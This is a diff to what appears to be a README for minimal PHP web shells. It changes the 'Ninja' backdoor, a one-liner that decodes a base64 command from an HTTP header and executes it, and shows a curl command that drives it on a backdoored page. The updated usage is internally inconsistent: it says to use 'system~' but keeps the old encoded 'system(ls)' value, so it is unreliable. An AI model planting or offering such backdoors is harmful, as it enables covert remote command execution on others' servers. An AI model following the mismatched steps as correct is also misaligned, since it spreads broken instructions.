@@ -24,7 +24,7 @@ For example, the code below will execute the `ls` command:
 
 ### Ninja
 ```php
-<?preg_match('/(.*)\((.*)\)/',base64_decode(substr(getallheaders()['x'],1)),$c);@$c[1]($c[2]);
+<?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
 ```
 #### Features
 - 93 bytes in size
@@ -32,7 +32,7 @@ For example, the code below will execute the `ls` command:
 
 #### Usage
 This one a bit complex.\
-Lets say you want to run `system(ls)` so you will need to base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
+Lets say you want to run `system(ls)` so write it as `system~` and then base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
 Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`\
 Now open your terminal and type the following command\
 `curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
